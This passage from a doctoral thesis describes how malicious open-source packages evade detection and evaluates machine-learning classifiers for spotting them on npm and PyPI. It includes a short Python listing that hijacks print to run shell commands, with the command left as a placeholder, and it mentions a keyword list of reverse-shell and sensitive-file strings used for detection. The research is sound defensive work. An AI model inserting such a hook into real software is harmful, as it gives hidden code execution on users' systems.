_Visual Deception._ Attackers may employ visual deception techniques to make manual code review more challenging. One such technique involves adding excessive spaces, tabs, or other forms of whitespace to the code [208]. Compared with the other obfuscation techniques, this one capitalizes on human visual processing, as the excessive spaces can make it difficult for reviewers to spot anomalies or suspicious code patterns. 

Another technique involves the use of Unicode homoglyphs or control characters [35]. The intent is to visually camouflage the malicious code, making it blend in with the surrounding code and potentially bypass casual inspection[2] . 

_Polyglot Malwares and In-Line Assembly._ Polyglot malwares employ multiple programming languages within a single malware instance. By combining different programming languages, attackers can exploit the unique characteristics of each language, thereby increasing the complexity of their malware. Moreover, certain programming languages allow the inclusion of assembly instructions directly in the source code. In-line assembly provides a means for direct interaction with system components and precise control over system resources. To the best of our knowledge, also this technique has not been observed (yet) in real-world attacks. 

Effectively analyzing and detecting the behavior of malware that employs multiple languages or incorporates in-line assembly requires advanced skills and expertise from security analysts and researchers. It demands a deep understanding of the intricacies of various programming languages and the low-level operations of the underlying system. 

> 2. This issue has started being addressed by some IDEs and compilers 

102 

_6.3. Evasion Techniques_ 

Furthermore, traditional security mechanisms and tools may struggle to cope with the complexity introduced by polyglot malwares and in-line assembly. 

## **Dynamic Code Transformations** 

In this category, we encompass techniques that involve transforming the code at runtime before its execution [187]. These techniques are not detectable through static analyzers. 

_Encoding, Compression and Encryption._ Similar to strings, attackers can transform the malicious code itself using encoding, compression, or encryption techniques [27]. At runtime, the code is then decoded, decompressed or decrypted back to its original form before being executed. This is similar to the concept of _packing_ for binary malwares [187], [209]. 

_Steganography._ Steganography consists of hiding information by embedding it within other data, such as images, audio files, or even seemingly harmless text files. Attackers may employ steganography as a technique to conceal malicious code within innocuous-looking files, as it happened with the case of the package `apicolor-1.2.4` in PyPI [210]. 

_Dynamic Code Modification._ Malicious 3rd-party dependencies can manipulate the behavior of commonly used methods by developers (e.g., built-in functions of a language like `System.out.println` in Java [211]) before their execution [187]. This tactic not only hides the invocation of malicious behavior within apparently harmless calls in the downstream application but also heightens the likelihood of such malicious code being triggered by the victim. 

In dynamically typed languages (e.g., Python, JavaScript, Ruby), this functionality is already supported through monkey patching [33]. Listing 6.7 illustrates an instance of monkey-patching in Python, where the built-in function `print` is tampered with to execute shell command(s). In statically typed languages (e.g., Rust, Go), achieving this goal can be less straightforward and one possible way is through function/API hooking [212]. In the Java programming language, attackers can insert malicious code during runtime by altering the bytecode of a trusted Java class file that is utilized by downstream users. This could involve exploiting the Java instrumentation API or manipulating the classloading mechanism [213]. 

Listing 6.7 – Example of monkey-patching the built-in function `print` in Python to make it execute shell command(s) 

103 

Chapter 6 – _Contribution 3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems_ 

- 1 `import os , builtins` 

- 2 

- 3 `original_print = print` 4 `def hacked_print(self):` 5 `original_print (self)` 

- 6 **`os.system("..COMMANDS..")`** 7 `builtins.print = hacked_print` 

**Remarks on warning suppression.** To avoid alerting the victim or halting program execution due to exceptions, malware developers often employ a technique where they enclose the malicious code within a try block and associate it with an empty catch block. This technique is used to suppress any exception that may be thrown during the execution of the malicious code [6]. In programming languages like Python and Java, the try-catch construct allows developers to handle exceptions gracefully and perform appropriate actions when an exception occurs. However, in the case of malware, the catch block is deliberately left empty, effectively silencing any exceptions that may occur. 

By using an empty catch block, the malware ensures that any exceptions raised during its execution are not propagated or displayed to the user. This helps maintain stealth and prevents any error messages or abnormal program behavior that may alert the victim or raise suspicion. 

From a security standpoint, the presence of empty catch blocks in code should raise suspicion and indicate potentially malicious activities. It is important for security analysts and developers to be vigilant and thoroughly analyze code for such suspicious constructs during code reviews and security assessments. 

## **6.4 Conclusion** 

In this section, we have conducted an investigation into how third-party dependencies can achieve ACE by distributing malicious packages to downstream users. Given the diversity of programming languages, our analysis focuses on some of the most commonly used languages and their respective package managers. These include Python (pip), JavaScript (npm), Ruby (gem), PHP (composer), Rust (cargo), Go (go), and Java (mvn). Additionally, we have explored the evasion techniques that attackers may employ in order to circumvent detection measures. 

Having gained a comprehensive understanding of OSS supply chain attacks, their execution mechanisms, and the tactics used by attackers to run malicious code, we are 

104 

_6.4. Conclusion_ 

now prepared to delve into the investigation of detection techniques aimed at preventing OSS supply chain attacks. In the subsequent Chapter, we will explore the application of Machine Learning (ML) techniques to classify malicious packages in both npm and PyPI. 

105 

Chapter 7 

# **- CONTRIBUTION 4 EVALUATION OF ML-BASED APPROACH TO THE DETECTION OF MALICIOUS PACKAGES IN JAVASCRIPT AND PYTHON** 

## **Summary** 

**Problem Addressed:** P4 - Automate Detection 

**Key Contribution(s):** Evaluation of the efficacy of a ML-based approach for cross-language detection in JavaScript and Python. This process is steered by the introduction of 141 languageindependent features and includes an empirical evaluation of the trained model. As a result of this work, approximately 60 previously unknown malicious packages were identified and reported. **Contribution Type:** Preventing 

**Point of view:** Defender 

**Associated Publication(s):** See reference [5] 

**Scope:** 

**==> picture [212 x 101] intentionally omitted <==**

**----- Start of picture text -----**<br>
ATTACKER<br>1. Make the  2. Make the victim  3. Make the victim<br>malicious OSS  download the  execute the<br>package available malicious OSS  malicious code in<br>package the OSS package<br>DEFENDER<br>Detect malicious package<br>before download or<br>execution<br>**----- End of picture text -----**<br>


As previously discussed in Section 2.2, one effective strategy to combat OSS supply chain attacks is the detection of malicious behavior within packages obtained from package repositories. 

Recent research [29], [72]–[74] has introduced the application of ML techniques to scrutinize packages in the npm ecosystem (as detailed in Section 2.2). The primary hurdle 

107 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

in employing ML methodologies for the detection of malicious packages lies in the availability of adequately labeled data. Presently, the most widely used dataset for malicious packages is BKC [60], comprising 102 distinct malicious packages for JavaScript and 92 for Python (as of our analysis in October 2022). 

Despite the inherent differences between programming languages, such as their unique sets of sensitive APIs, we have noted that malicious packages from both the Python and JavaScript ecosystems exhibit shared characteristics. For instance, the code segments responsible for malicious behavior often feature obfuscated strings and the utilization of installation scripts. 

In this section, our objective is to assess the feasibility of employing ML techniques to identify commonalities in malicious behaviors across distinct programming languages, particularly Python and JavaScript. This endeavor involves the development of a _crosslanguage_ classifier, trained on a dataset encompassing samples from both languages. Simultaneously, we develop two separate _mono-language_ classifiers trained on datasets consisting solely of samples from either JavaScript or Python. 

We set out to answer the following research questions: 

– **RQ4.1** Which cross-language and mono-language models demonstrate the best trade-off between precision and recall when detecting malicious packages in the case of JavaScript and Python languages? 

– **RQ4.2** How do the models identified in **RQ4.1** perform in the detection of potentially malicious packages in the wild? 

Our work’s technical contributions in addressing these questions are as follows. 

Firstly, we propose the use of 141 language-independent features, derived from a combination of previous works [29], [72] as well as expert knowledge. 

Secondly, we evaluate tree-based learning algorithms, specifically Decision Tree (DT), Random Forest (RF), and eXtreme Gradient Boosting (XGBoost), to train three classifiers for distinct datasets: one comprising solely JavaScript packages, another containing only Python packages, and a third containing packages from both languages. Out of the 9 models generated, we discovered that both the cross-language and mono-language models based on XGBoost performed best in a controlled experiment. 

Thirdly, we conduct a real-world assessment of these models by analyzing packages uploaded daily to npm and PyPI over a 10-day period. This experiment revealed that the cross-language model outperformed the respective mono-language models. 

Lastly, throughout our analysis involving 31,292 packages, we successfully identified 58 

108 

_7.1. Methodology_ 

previously unidentified malicious packages across npm and PyPI. We promptly reported these malicious discoveries to the respective repositories, which confirmed our findings. Moreover, we enhanced BKC[1] by uploading these newly identified malicious packages. 

## **7.1 Methodology** 

In this section, we expound upon the approach employed to address the research questions. 

In alignment with previous work [29], [72], we execute both a controlled experiment and a real-world investigation to provide responses to research questions **RQ4.1** and **RQ4.2** . The framework for addressing these research questions is elucidated in Figure 7.1. 

Our response to **RQ4.1** entails a controlled experiment, wherein we leverage labeled datasets, as outlined in Section 7.1, to assess the performance of the trained classifiers within the contexts of npm and PyPI. Subsequently, upon the identification of the most effective models, we scrutinize newly published packages in both npm and PyPI, enabling us to address RQ4.2. 

The labeled dataset, the top-performing models from **RQ4.1** , and the compilation of malicious packages discovered in real-world scenarios are accessible online[2] . 

In the forthcoming subsections, we provide details about the model training process employed in resolving the research questions. 

## **Models Training** 

In this section, we outline the training process for both the mono-language and crosslanguage models, which are designed to classify malicious packages. First, we describe the datasets we constructed, comprising benign and malicious packages in JavaScript and Python. Then, we delve into the algorithms and optimizations employed to obtain the models. Finally, we present the collection of language-independent features extracted from the packages. 

## **Datasets** 

We build a labeled dataset of benign and malicious packages. Given that benign packages significantly outnumber malicious ones in real package repositories, we create an 

> 1. Commit `6d7d140168f80c048fc1622a4788b1f5c17af2d0` 

> 2. `https://github.com/SAP-samples/cross-language-detection-artifacts` 

109 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

**==> picture [227 x 211] intentionally omitted <==**

**----- Start of picture text -----**<br>
Input<br>Labeled<br>Dataset RQ4.1: Models Evaluation<br>Output<br>❖ 5-fold  Best-Performing<br>cross-validation Models<br>Controlled Experiment<br>Learning  Mono-language (npm)<br>Algorithms Mono-language (PyPI)<br>Cross-language<br>Decision Tree<br>Random Forest<br>XGBoost<br>RQ4.2: Real-World Evaluation<br>Output<br>Unlabeled<br>Dataset ❖ Real-world  Best-Performing<br>experiment (cf.  Models<br>Fig. 3) Real-world Experiment<br>Mono-language (npm)<br>Mono-language (PyPI)<br>Cross-language<br>**----- End of picture text -----**<br>


– Figure 7.1 Workflow followed for the evaluation of our approach for the detection of potentially malicious packages. 

imbalanced dataset to reflect this reality. As the exact ratio of malicious to benign packages remains uncertain, we adopt the 90-10 ratio between benign and malicious samples, as recommended in previous studies [214], [215]. 

|**Language**||**Total #**|**Filter by**|**Filter by**|**Filter by**|
|---|---|---|---|---|---|
||**of **|**samples**|**version**|**campaign**|**duplicates**|
|JavaScript||2071|1505|1408|102|
|Python||273|225|133|92|



– Table 7.1 Number of malicious samples remaining after applying each filtering step. 

**Malicious samples.** We use BKC [60], which is a collection of malicious OSS packages found in popular package repositories and voluntarily contributed by the community. At the time of writing (October 2022, commit `c2d9691` ) BKC contains a total of 3,161 packages for different ecosystems: 2,071 JavaScript, 273 Python, 813 Ruby, and 4 Java packages. Since our focus is on JavaScript and Python, we restrict to packages for such ecosystems. It is noteworthy that a significant portion of the packages is associated with malware campaigns (i.e., packages having different names but containing the same malicious behavior [27]). Consequently, it is possible to encounter multiple duplicates within the BKC dataset. To avoid bias we remove duplicates from the dataset. We consider as duplicates packages that _(i)_ have multiple versions, _(ii)_ are marked as part of a campaign 

110 

_7.1. Methodology_ 

in BKC, and _(iii)_ have the same values for the considered features (cf. Section 7.1). In the first case, we consider only the latest version. For packages belonging to the same campaign or having the same values for the features, we take only one sample. Table 7.1 shows the number of packages remaining after each filtering step. Finally, we get 102 malicious packages for npm and 92 for PyPI. 

Regarding malicious behaviors, it is worth mentioning that our approach is limited to those present in BKC, i.e., reverse shell, dropper, data exfiltration, DoS, and financial gain [27]. Therefore, additional behaviors (e.g., phishing campaigns [28]) are out of our scope. 

**Benign samples.** Since no ground truth for benign packages exists, we build our dataset as follows. 

Assuming that popular projects in npm and PyPI are free from malicious code [72], we aim at collecting these projects and use the popularity information provided by `libraries.io`[3] through the SourceRank score[4] . Since `libraries.io` offers APIs to search for packages by category (e.g., machine learning, math, UI) but not by popularity, we adopted the following approach to gather popular packages. First, we compiled a list of 150 categories from the ones suggested by the `libraries.io` UI for the most popular packages. Second, we searched for these keywords and sorted the results in descending order of popularity. Third, we selected the top- _n_ projects for each ecosystem to maintain the desired 90-10 ratio (i.e., 828 for Python and 918 for JavaScript). Finally, we download the packages from the respective package repositories (i.e., npm for JavaScript and PyPI for Python). 

**Mono-language and Cross-Language Datasets.** Once we have collected both malicious and benign packages, we proceed to construct various types of datasets. The two mono-language datasets contain packages in a single programming language: one for JavaScript and one for Python. The cross-language dataset consists of the union of the two mono-language datasets. Table 7.2 shows the number of packages contained in each dataset and related stratification in benign and malicious. 

## **Algorithms Selection and Tuning** 

The main objective of our work is to explore the feasibility of cross-language detection of malicious packages. As mentioned earlier, malicious packages are assumed to be sig- 

> 3. `https://libraries.io/` 

> 4. `https://docs.libraries.io/overview.html#sourcerank` 

111 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

|**Type**|**Programming**|**Malicious**|**Benign**|
|---|---|---|---|
||**Language(s)**|**samples**|**samples**|
|Mono-language|JavaScript|102|918|
|Mono-language|Python|92|828|
|Cross-language|JavaScript+Python|194|1640|



– Table 7.2 Composition of both mono-language and cross-language datasets. 

nificantly fewer than benign ones. Therefore, we seek supervised classification algorithms that are well-suited for imbalanced datasets, requiring no preprocessing of the dataset itself. Furthermore, to gain more insights into the performances of the models, we look for algorithms that provide explainable predictions. Finally, due to the number of features considered, we only consider learning algorithms that handle high-dimensional data. 

Algorithms that meet these criteria and that showed the best performances in recent works are Decision Tree (DT) [29], [72] and Random Forest (RF) [72]. In the context of tree-based algorithms, we also consider the XGBoost (XGB) algorithm [216], knowing that boosting algorithms are well-suited for imbalanced datasets [217]. We train the aforementioned classifiers using _scikit-learn_[5] . 

To fine-tune the selected algorithms for the classification problem we use the Bayesian Optimizer (BO) [218] in combination with 5-fold cross-validation to find the best combination of hyperparameters leading to the highest precision. We choose precision as the objective function to reduce the number of false positives, i.e., the number of samples that the security analyst has to manually review to confirm the classification. The value of the precision considered for the optimization problem is the average value obtained after the 5-fold cross-validation. 

For the DT classifier, the hyperparameters optimized through the BO are the maximum depth of the tree, maximum number of features, split criterion (i.e., information gain, Gini index, log-loss), the minimum number of observations within the leaves, and minimum number of samples required to split an internal node. For the RF classifier, in addition to the ones for DT, we also optimize the number of estimators (i.e., decision trees) and the maximum number of samples to train each tree. Finally, for the XGBoost classifier, the hyperparameters to be optimized are the maximum depth of the tree, number of estimators, subsample ratio of features to construct each tree, learning rate, minimum split loss, and minimum sum of hessian needed in a child node of the tree. 

> 5. `https://scikit-learn.org` 

112 

_7.1. Methodology_ 

## **Features** 

|**Type**|**Description**|**Captured **|**Behavior**||
|---|---|---|---|---|
|Boolean|Usage of installation hook(s)|Arbitrary code execution|||
|Continuous|Number of words in installation scripts|Structural|feature|of|
|||source code|||
|Continuous|Number of lines in installation scripts|Structural|feature|of|
|||source code|||
|Continuous|Number of words in source code fles|Structural|feature|of|
|||source code|||
|Continuous|Number of lines in source code fles|Structural|feature|of|
|||source code|||
|Continuous|Number of URLs|Security-sensitive|||
|||string(s)|||
|Continuous|Number of IP addresses|Security-sensitive|||
|||string(s)|||
|Continuous|Number of suspicious tokens in strings|Security-sensitive|||
|||string(s)|||
|Continuous|Number of base64 strings|Presence of|obfuscation||
|Continuous|Mean, std. deviation, 3rd quartile, and max|Presence of|obfuscation||
||value of Shannon entropy of strings in all||||
||source code fles||||
|Continuous|Number of homogeneous and heterogenous|Presence of|obfuscation||
||strings in all source code fles||||
|Continuous|Mean, std. deviation, 3rd quartile, and max|Presence of|obfuscation||
||value of Shannon entropy of identifers in all||||
||source code fles||||
|Continuous|Number of homogeneous and heterogenous|Presence of|obfuscation||
||identifers in all source code fles||||
|Continuous|Mean, std. deviation, 3rd quartile, and max|Presence of|obfuscation||
||value of Shannon entropy of strings in instal-||||
||lation script||||



113 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

|Continuous|Mean, std. deviation, 3rd quartile, and max|Presence of obfuscation|
|---|---|---|
||value of Shannon entropy of identifers in in-||
||stallation script||
|Continuous|Mean, std. deviation, 3rd quartile, and max|String manipulation|
||value of ratio of square brackets per source||
||code fle size||
|Continuous|Mean, std. deviation, 3rd quartile, and max|String manipulation|
||value of ratio of equal signs per source code||
||fle size||
|Continuous|Mean, std. deviation, 3rd quartile, and max|String manipulation|
||value of ratio of plus signs per source code||
||fle size||
|Continuous|No. of fles per selected extensions (91 in to-|Structural feature of the|
||tal)|package|



– Table 7.3 Set of features considered for the classification of malicious packages. 

To identify the features of interest we inspect the malicious samples available in BKC [60]. Since our goal is to detect the presence of malicious code in more than one programming language, we do not consider features specifically crafted for a certain programming language (e.g., usage of certain APIs), but we focus on lexical and structural aspects. Thus, we adopt the features proposed in [29], [72] that have general applicability and are not specific to JavaScript (cf. Table 7.4). Then, we propose additional features based on expert knowledge. 

The final set of features considered in our work is described in Table 7.3. Such features capture characteristics of strings, identifiers, file extensions, and the usage of installation hooks. Their independence from a specific language has the advantage that they do not need constant maintenance as it would be required for language-specific features, like a list of security-related APIs. 

We utilize the Pygments lexer[6] to parse and process the source code files ( _.js, .py_ ) as well as the installation scripts ( _package.json, setup.py_ ) of the package being analyzed. From such files, we extract the following types of lexical tokens: strings, identifiers, operators, and punctuation. 

In the following, we describe and motivate the choice of the different features. 

> 6. https://pygments.org/ 

114 

_7.1. Methodology_ 

|**Target Language:**|**Our work**<br>**Sejfa**<br>**et**<br>**al.**<br>**[29]**<br>**Ohm**<br>**et**<br>**al.**<br>**[72]**<br>**Zhang**<br>**et**<br>**al.**<br>**[73]**<br>Python,<br>JavaScript<br>JavaScript<br>JavaScript<br>Python,<br>JavaScript<br>Static<br>Static<br>Static<br>Static|
|---|---|
|**Analysis type:**||
|**Features:**<br>Use of installation hooks<br>No. of words/lines in installation<br>scripts<br>No. of words/lines in source code<br>Presence of URLs<br>Presence of IP addresses<br>Presence of Base64 strings<br>Presence of sensitive strings<br>Presence of obfuscation<br>Presence of executables<br>Count of script fles<br>Count of fles per extension<br>Stats on square brackets<br>Stats on equal sign<br>Stats on plus sign<br>Use of sensitive APIs||



– Table 7.4 Comparison (in terms of features) with related works [29], [72], [73] in the context of machine-learning approaches applied to the detection of malicious packages in package repositories. 

115 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

**Usage of installation hooks.** As described in Section 6.2, the installation script is commonly used by attackers to trigger execution via installation hooks. Thus, we detect the presence of the _setup.py_ file (for Python) and of the tokens _install, post-install, preinstall_ in the _package.json_ file (for JavaScript) using a boolean feature. 

**Code obfuscation.** A property that often characterizes malicious strings is obfuscation. To detect obfuscation and encodings (e.g., base64) in both strings and identifiers, we leverage the Shannon entropy [6] combined with the concept of Generalization Language (GL) [219]. Generalization Languages are used in the context of error detection and consist of encoding data using a pre-defined alphabet to abstract specific values into a pattern. The observation made by Huang et al. [219] is that abstracting specific values into patterns overcomes data sparsity and makes co-occurrence of values more reliable to quantify compatibility (in our case the Shannon entropy) between patterns. 

In our case, given a string or identifier (i.e., variable, function, and class names) as input, we transform every character _x_ using the following mapping: 

**==> picture [347 x 85] intentionally omitted <==**

where _GL_ 4 indicates a GL with an alphabet of four symbols. For example, the string _YmFzaA==_ (base64 encoding of _bash_ ) becomes _ULULLUSS_ , whereas a non-encoded string like _while_ becomes _LLLLL_ . Once the strings or the identifiers are transformed using _GL_ 4, we compute the mean, standard deviation, 3rd quartile, and maximum value of Shannon entropy in both the cases of source code files and installation scripts. Also, for both strings and identifiers, we count those that are homogeneous (i.e., having all characters equal after _GL_ 4 encoding) and heterogeneous (i.e., having at least one different character after _GL_ 4 encoding). 

**Sensitive Strings.** Malicious code generally introduces strings with certain properties (e.g., URLs, shell commands). To detect the presence of security-related strings, we adopt the approach presented in [6]. Thus, we build a dictionary of keywords from offensive security cheat sheets (e.g., reverse shells, the path to sensitive files). The keywords are included both in plain text and in different encodings (e.g., base64, base32, rot-13, URLencoding). The corresponding feature consists of the count of hits to this dictionary. 

116 

_7.1. Methodology_ 

**Structural features of source code files and string manipulation.** We capture the code size by counting the number of words and the number of lines of code. 

For symbols commonly used to manipulate strings (i.e., plus sign, equal sign, and square brackets) we compute their ratio over the size of the file containing them and we report mean, standard deviation, 3rd quartile, and maximum value for all the files contained in the analyzed package. 

**Structural features of the package.** Since malicious packages may execute malware from external resources to the running script (e.g., binaries, shell scripts), we build a custom list of 91 popular file extensions based on the ones appearing in the malicious packages contained in BKC. We report the count of files contained in the analyzed package for these extensions. 

To support the choice of the features described above, we inspect their statistical distribution. In particular, we compare the distribution of the features when they are extracted from benign packages and malicious packages. This allows us to initially assess whether the proposed features are able to discriminate between the two classes. Figure 7.2 depicts the violin plots for some representative cases. Comparing the distributions in benign and malicious cases, we observe significant differences for most of the features. In the cases where the distributions are similar (e.g., No. of IP addresses in source code files), we still detect that at least one of the statistical measures (e.g., mean, median, minimum value) differs between the malicious and benign cases. 

|DT<br>RF<br>**XGB**<br>DT<br>RF<br>**XGB**|**JavaScript**<br>**Mono-language**<br>**Cross-language**<br>(Train set: JS; Test Set: JS)<br>(Train set: JS+PY; Test Set: JS)<br>Pr.<br>Rec.<br>F1<br>Acc.<br>Pr.<br>Rec.<br>F1<br>Acc.<br>**100.0±0.0**<br>68.0±8.89<br>80.6±6.5<br>96.9±0.9<br>95.9±6.9<br>49.5±17.6<br>63.0±20.1<br>94.8±1.7<br>98.5±3.1<br>53.5±14.7<br>68.1±12.8<br>95.3±1.4<br>**98.5±3.1**<br>50.0±16.8<br>64.55±16.1<br>95.0±1.6<br>96.5±4.0<br>**75.5±6.9**<br>**84.4±4.2**<br>**97.3±0.6**<br>97.1±3.8<br>**63.5±10.3**<br>**76.3±7.9**<br>**96.2±1.0**<br>**Python**<br>**Mono-language**<br>**Cross-language**<br>(Train set: PY; Test Set: PY)<br>(Train set: JS+PY; Test Set: PY)<br>Pr.<br>Rec.<br>F1<br>Acc.<br>Pr.<br>Rec.<br>F1<br>Acc.<br>81.6±18.3<br>28.9±14.8<br>39.4±11.2<br>92.0±0.6<br>97.2±8.3<br>16.7±9.6<br>27.4±13.8<br>91.6±1.0<br>79.2±9.4<br>51.7±14.4<br>61.0±9.9<br>93.8±1.0<br>92.5±16.9<br>15.6±8.6<br>25.9±12.9<br>91.6±0.9<br>**74.4±13.0**<br>**63.9±13.7**<br>**68.0±11.6**<br>**94.2±2.0**<br>**87.1±11.1**<br>**55.6±13.4**<br>**66.9±11.1**<br>**94.8±1.5**|**JavaScript**<br>**Mono-language**<br>**Cross-language**<br>(Train set: JS; Test Set: JS)<br>(Train set: JS+PY; Test Set: JS)<br>Pr.<br>Rec.<br>F1<br>Acc.<br>Pr.<br>Rec.<br>F1<br>Acc.<br>**100.0±0.0**<br>68.0±8.89<br>80.6±6.5<br>96.9±0.9<br>95.9±6.9<br>49.5±17.6<br>63.0±20.1<br>94.8±1.7<br>98.5±3.1<br>53.5±14.7<br>68.1±12.8<br>95.3±1.4<br>**98.5±3.1**<br>50.0±16.8<br>64.55±16.1<br>95.0±1.6<br>96.5±4.0<br>**75.5±6.9**<br>**84.4±4.2**<br>**97.3±0.6**<br>97.1±3.8<br>**63.5±10.3**<br>**76.3±7.9**<br>**96.2±1.0**<br>**Python**<br>**Mono-language**<br>**Cross-language**<br>(Train set: PY; Test Set: PY)<br>(Train set: JS+PY; Test Set: PY)<br>Pr.<br>Rec.<br>F1<br>Acc.<br>Pr.<br>Rec.<br>F1<br>Acc.<br>81.6±18.3<br>28.9±14.8<br>39.4±11.2<br>92.0±0.6<br>97.2±8.3<br>16.7±9.6<br>27.4±13.8<br>91.6±1.0<br>79.2±9.4<br>51.7±14.4<br>61.0±9.9<br>93.8±1.0<br>92.5±16.9<br>15.6±8.6<br>25.9±12.9<br>91.6±0.9<br>**74.4±13.0**<br>**63.9±13.7**<br>**68.0±11.6**<br>**94.2±2.0**<br>**87.1±11.1**<br>**55.6±13.4**<br>**66.9±11.1**<br>**94.8±1.5**|
|---|---|---|
|||97.2±8.3<br>16.7±9.6<br>27.4±13.8<br>91.6±1.0<br>92.5±16.9<br>15.6±8.6<br>25.9±12.9<br>91.6±0.9<br>**87.1±11.1**<br>**55.6±13.4**<br>**66.9±11.1**<br>**94.8±1.5**|



– Table 7.5 Results of 5-fold cross validation experiment for both the cases of JavaScript (JS) and Python (PY). For both mono-language and cross-language models, we report precision (Pr.), recall (Rec.), F1-score (F1), and accuracy (Acc.) in percentages. 

117 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

**==> picture [455 x 465] intentionally omitted <==**

– Figure 7.2 Distribution of a subset of continuous features extracted from benign and malicious samples (both Python and JavaScript). 

118 

_7.2. Controlled Experiment_ 

## **7.2 Controlled Experiment** 

We evaluate the performances of the classification algorithms described in Section 7.1 to solve the task of detecting potentially malicious packages with a controlled experiment, where labels of data are known. 

To address the limitation of small dataset sizes, we follow an approach similar to [29] and refrain from keeping a separate hold-out set. Instead, we conduct a 5-fold crossvalidation experiment, repeating it ten times. This approach allows us to assess the performance of the models and report the corresponding score metrics. During each split of the cross-validation, we employ stratified sampling to ensure that the 90-10 ratio between benign and malicious samples is maintained. 

Each learning algorithm (i.e., DT, RF, XGBoost) is trained respectively on the two mono-language datasets and on the cross-language dataset (cf. Section 7.1). We obtain a total of 9 classifiers. Table 7.5 reports the percentage values - computed on the positive class (i.e., malicious packages) - of precision, recall, F1-score, and accuracy after the 5-fold cross-validation for each ecosystem. 

**Detection in JavaScript.** Considering the mono-language case (i.e., both train and test sets composed of only JavaScript samples), the model providing the highest precision is the one obtained with the DT algorithm (i.e., 100%). However, such a model is subject to a high number of false negatives (recall of 68.0%) when compared to XGBoost (recall of 75.5%). In fact, the latter model achieves the best trade-off between accuracy and recall (i.e., F1 score of 84.4%). 

For the cross-language case (i.e., train set composed of JavaScript and Python samples, test set composed of JavaScript samples only), the model achieving the highest precision is RF. However, the best trade-off is offered also in this case by XGBoost. 

**Detection in Python.** In both the case of mono-language models for Python (i.e., train and test sets composed of only Python samples) and cross-language models (i.e., train set composed of JavaScript and Python samples, test set composed of Python samples only), the model with highest precision is DT. However, the recall is too low to have practical utility. Thus, also in this case XGBoost outperforms the other models, having a precision of 74.4%, recall of 63.9%, and F1-score of 68.0%. 

119 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

**==> picture [307 x 243] intentionally omitted <==**

**----- Start of picture text -----**<br>
Package Feat. 1  Feat. 2  ...  Feat. N<br>foo-1.0.0 val 1  val 2  ... val N<br>bar-0.1.2 val 1  val 2  ... val N<br>Package Package   Feature<br>Repository  Collection Extraction<br>X X X X<br>X X X X<br>O O O O<br>O O O O<br>Language-Specific Cross-Language<br>Classifier  Classifier<br>Benign Class Malicious Class Manual<br>Inspection<br>**----- End of picture text -----**<br>


– Figure 7.3 Experiment consisting of the classification of daily-uploaded packages in PyPI and npm for the detection of malicious packages in the wild. The depicted procedure applies to both npm and PyPI. 

## **Response to RQ4.1** 

As shown in Table 7.5, the XGBoost models exhibit the most favorable balance between precision and recall in both the mono-language and cross-language scenarios for both JavaScript and Python packages. 

By evaluating the performances of the XGBoost models both in the mono-language and cross-language case, it appears that the mono-language model performs slightly better than the cross-language one in the classification of JavaScript packages. Vice versa, in the case of Python, the cross-language model based on XGBoost performs slightly better than the mono-language one. Since a hold-out set was not used, the comparison between the cross-language and mono-language models, which exhibit the best performance, is addressed in the real-world experiment in Section 7.3. 

120 

_7.3. Real-World Evaluation_ 

|Mono-language<br>**Cross-language**|**npm (JavaScript)**<br>Benign<br>Malicious<br>Malicious<br>Pr.<br>(FP)<br>(TP)<br>10428<br>1229<br>38<br>3.1%<br>10519<br>1083<br>37<br>**3.4%**|**PyPI (Python)**<br>Benign<br>Malicious<br>Malicious<br>Pr.<br>(FP)<br>(TP)|
|---|---|---|
|||19097<br>485<br>15<br>3.1%<br>19196<br>385<br>17<br>**4.4%**|



Table 7.6 – Comparison of mono-language and cross-language models in classifying dailyuploaded packages from the wild for 10 days. The best results are highlighted in bold. 

**==> picture [463 x 205] intentionally omitted <==**

**----- Start of picture text -----**<br>
npm PyPI<br>Malicious Flags (FP) Malicious Flags (FP)<br>Total: Total:<br>Mono-language = 1229 Mono-language = 561<br>419 798 275 Cross-language = 1083 228 251 132 Cross-language = 453<br>(a) (b)<br>Malicious Flags (TP) Malicious Flags (TP)<br>Total: Total:<br>Mono-language = 38 Mono-language = 15<br>1 37 0 Cross-language = 37 3 12 5 Cross-language = 17<br>(c) (d)<br>**----- End of picture text -----**<br>


– Figure 7.4 Comparison of results for the malicious samples classified by the monolanguage and cross-language models in the case of npm. In (a) and (b) the false positives for npm and PyPI respectively. In (c) and (d) the true positives for npm and PyPI respectively. 

121 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

## **7.3 Real-World Evaluation** 

In this section, we evaluate how the mono-language models and the cross-language model identified in **RQ4.1** (cf. Section 7.2) perform in the classification of benign and malicious packages in the wild. To do so we conduct the experiment depicted in Figure 7.3. 

We collect newly uploaded packages to npm and PyPI within a period of 10 days (i.e., from Oct. 24 to Nov. 2, 2022). To get the list of packages uploaded to PyPI on a given day we rely on the XML-RPC APIs of the official warehouse[7] . Since a comparable feature is not available for npm, we use the RSS feed about new npm packages from _libraries.io_[8] . For both npm and PyPI, we directly download the packages from the official package repositories. 

We extract the features from the downloaded packages as described in Section 7.1 and classify such packages using both the mono-language model (of the related ecosystem) and the cross-language model identified in Section 7.2. For the packages classified as malicious by at least one model, we conduct a manual review to verify the true positives and false positives. In the case of npm packages, we manually inspect _.js_ , _.sh_ , and _package.json_ files while for PyPI packages we inspect _.py_ and _.sh_ files. In the manual analysis, we look for signs of malicious behavior (e.g., implementation of reverse shells, data exfiltration), and for the obfuscated scripts we attempt to de-obfuscate them. Table 7.6 reports the results of the classification performed by both the mono-language and cross-language models. 

